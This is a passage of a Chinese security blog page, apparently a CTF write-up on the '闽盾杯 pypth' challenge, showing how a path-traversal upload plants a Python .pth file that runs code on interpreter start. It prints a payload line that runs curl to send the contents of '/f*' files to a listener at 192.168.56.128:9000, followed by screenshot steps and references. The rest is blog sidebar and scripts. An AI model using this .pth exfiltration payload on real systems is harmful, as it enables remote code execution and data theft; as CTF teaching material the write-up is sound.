class="literal">None</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在文件上传这里是将上传文件存储到 <code>/tmp/storage</code> 目录下，但是这里没有限制，存在<strong>目录穿越漏洞</strong></p>
+<p>所以我们可以上传文件名：<code>../extract/1.pth</code>，内容为：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os;os.popen(<span class="string">&#x27;curl http://192.168.56.128:9000?a=`cat /f*`&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<p>这样在 add路由 我们就会将 <code>/tmp/extract</code> 目录下面的 <code>1.pth</code> 添加到 <code>模块搜索路径</code> 中</p>
+<p>当执行python时，就会执行命令</p>
+<p><strong>步骤：</strong></p>
+<p>我们上传一个文件： <code>../extract/1.pth</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="./s2.loli.net/2023/05/27/IuNvyOlFWnbox1D.png" alt="image-20230527161530186"></p>
+<p>然后在虚拟机开启监听9000端口：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="./s2.loli.net/2023/05/27/yhsLS1CUDQ8ENgf.png" alt="image-20230527161611275"></p>
+<p>接着我们点击 add 添加模块</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="./s2.loli.net/2023/05/27/EZ1S9boDIUfimBz.png" alt="image-20230527161638748"></p>
+<p>成功把flag外带出来：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="./s2.loli.net/2023/05/27/JRzauMpoW2ylFh7.png" alt="image-20230527161729793"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/site.html">site-指定域配置钩子</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.sonarsource.com/blog/pretalx-vulnerabilities-how-to-get-accepted-at-every-conference/">Code Execution via Site-Specific Configuration Hooks</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Nestar/p/17336664.html">Python pth 文件写入 getshell 或权限维持</a></p>
+<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/python-pth-file-write-getshell/">Python pth文件写入getshell</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://leekoscn.github.io">LIKE</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://leekoscn.github.io/posts/f85138ce083e/">https://leekoscn.github.io/posts/f85138ce083e/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://leekoscn.github.io" target="_blank">Tranquility</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E3%80%90python%E3%80%91pth%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell/">【python】pth文件写入getshell</a></div><div class="post_share"><div class="social-share" data-image="/img/hello-world.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechatpay.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/wechatpay.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/41d2de86d56c/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/hello-world.webp" onerror="onerror=null;src='/img/hello-world.webp'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">【RCTF2015】EasySQL</div></div></a></div><div class="next-post pull-right"><a href="/posts/1da88b4da89f/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/hello-world.webp" onerror="onerror=null;src='/img/hello-world.webp'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info"></div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">LIKE</div><div class="author-info__description">这是个人博客，分享技术的地方~</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">215</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">107</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">31</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/leekoscn"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/leekoscn" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://blog.csdn.net/qq_61839115?spm=1000.2115.3001.5343" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=2500495325&amp;website=www.oicqzone.com" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="mailto:2500495325@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#python-pth%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell"><span class="toc-number">1.</span> <span class="toc-text">[python]pth文件写入getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C"><span class="toc-number">1.2.</span> <span class="toc-text">实验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%93%E5%B1%95"><span class="toc-number">1.4.</span> <span class="toc-text">拓展</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-%E9%97%BD%E7%9B%BE%E6%9D%AF-pypth"><span class="toc-number">1.4.1.</span> <span class="toc-text">例题： [闽盾杯]pypth</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.5.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/50182c4e289e/" title="小迪-day17(编解码、二次注入、DNSlog盲注)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/hello-world.webp" onerror="this.onerror=null;this.src='/img/hello-world.webp'" alt="小迪-day17(编解码、二次注入、DNSlog盲注)"/></a><div class="content"><a class="title" href="/posts/50182c4e289e/" title="小迪-day17(编解码、二次注入、DNSlog盲注)">小迪-day17(编解码、二次注入、DNSlog盲注)</a><time datetime="2023-08-22T10:05:22.621Z" title="发表于 2023-08-22 18:05:22">2023-08-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ee597ef53526/" title="小迪-day16（报错注入，延时、布尔盲注）"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/hello-world.webp" onerror="this.onerror=null;this.src='/img/hello-world.webp'" alt="小迪-day16（报错注入，延时、布尔盲注）"/></a><div class="content"><a class="title" href="/posts/ee597ef53526/" title="小迪-day16（报错注入，延时、布尔盲注）">小迪-day16（报错注入，延时、布尔盲注）</a><time datetime="2023-08-22T10:05:22.618Z" title="发表于 2023-08-22 18:05:22">2023-08-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/fa45560e3521/" title="小迪-day15(Oracle，MongoDB、access、msSQL、postgresql注入)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/hello-world.webp" onerror="this.onerror=null;this.src='/img/hello-world.webp'" alt="小迪-day15(Oracle，MongoDB、access、msSQL、postgresql注入)"/></a><div class="content"><a class="title" href="/posts/fa45560e3521/" title="小迪-day15(Oracle，MongoDB、access、msSQL、postgresql注入)">小迪-day15(Oracle，MongoDB、access、msSQL、postgresql注入)</a><time datetime="2023-08-22T10:05:22.617Z" title="发表于 2023-08-22 18:05:22">2023-08-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/44edbd1b2eba/" title="小迪-day14(注入类型之提交注入)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/hello-world.webp" onerror="this.onerror=null;this.src='/img/hello-world.webp'" alt="小迪-day14(注入类型之提交注入)"/></a><div class="content"><a class="title" href="/posts/44edbd1b2eba/" title="小迪-day14(注入类型之提交注入)">小迪-day14(注入类型之提交注入)</a><time datetime="2023-08-22T10:05:22.615Z" title="发表于 2023-08-22 18:05:22">2023-08-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/b6e16bf4bb82/" title="小迪-day13(MySQL注入)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/hello-world.webp" onerror="this.onerror=null;this.src='/img/hello-world.webp'" alt="小迪-day13(MySQL注入)"/></a><div class="content"><a class="title" href="/posts/b6e16bf4bb82/" title="小迪-day13(MySQL注入)">小迪-day13(MySQL注入)</a><time datetime="2023-08-22T10:05:22.611Z" title="发表于 2023-08-22 18:05:22">2023-08-22</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/hello-world.webp')"><div id="footer-wrap"><div class="copyright">&copy;2022-09 - 2023 By LIKE</div><div class="framework-info"><a href="https://beian.miit.gov.cn"  style="color:#fff" target="_blank">赣ICP备2022008842号</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'e5J90iDkXMWhU5UNlEX1I2hO-gzGzoHsz',
+      appKey: 'esLROw9j3xLk2nV4tQkKaih1',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>function electric_clock_injector_config(){
+                var parent_div_git = document.getElementsByClassName('col l3 hide-on-med-and-down expanded')[0];
+                var item_html = '<div class="card-widget card-clock"> <div class="card-glass"> <div class="card-background"><div class="card-content"> <div id="hexo_electric_clock"> <img id="card-clock-loading" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-clock/clock/images/weather/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading" class="entered loading"></div></div></div></div></div>';
+                console.log('已挂载electric_clock')
+                // parent_div_git.innerHTML=item_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",item_html) // 有报错，但不影响使用(支持pjax跳转)
+            }if( document.getElementsByClassName('col l3 hide-on-med-and-down expanded')[0] && (location.pathname ==='all'|| 'all' ==='all')){
+
+            electric_clock_injector_config()
+        } </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax  src="https://cdn.jsdelivr.net/gh/Zfour/hexo-electric-clock@1.0.6/clock.js"></script><script data-pjax>
+  function butterfly_clock_injector_config(){
+    var parent_div_git = document.getElementsByClassName('col l3 hide-on-med-and-down expanded')[0];
+    var item_html = '<div class="card-widget card-clock"> <div class="card-glass"> <div class="card-background"><div class="card-content"> <div id="hexo_electric_clock"> <img id="card-clock-loading" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-clock/clock/images/weather/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading" class="entered loading"></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_injector_config();
+  }
+  </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://unpkg.zhimg.com/hexo-butterfly-clock/lib/clock.min.js"></script><!-- hexo injector body_end end -->
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(e){e.imageLazyLoadSetting.processImages=t;var n=e.imageLazyLoadSetting.isSPA,i=e.imageLazyLoadSetting.preloadRatio||1,r=o();function o(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){n&&(r=o());for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(e.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];e=function(){r=r.filter(function(t){return o!==t})},(t=o).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,t.removeAttribute("data-original"),e&&e()},t.src!==i&&(n.src=i))}()}function a(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",a),e.addEventListener("resize",a),e.addEventListener("orientationchange",a)}(this);</script></body></html>
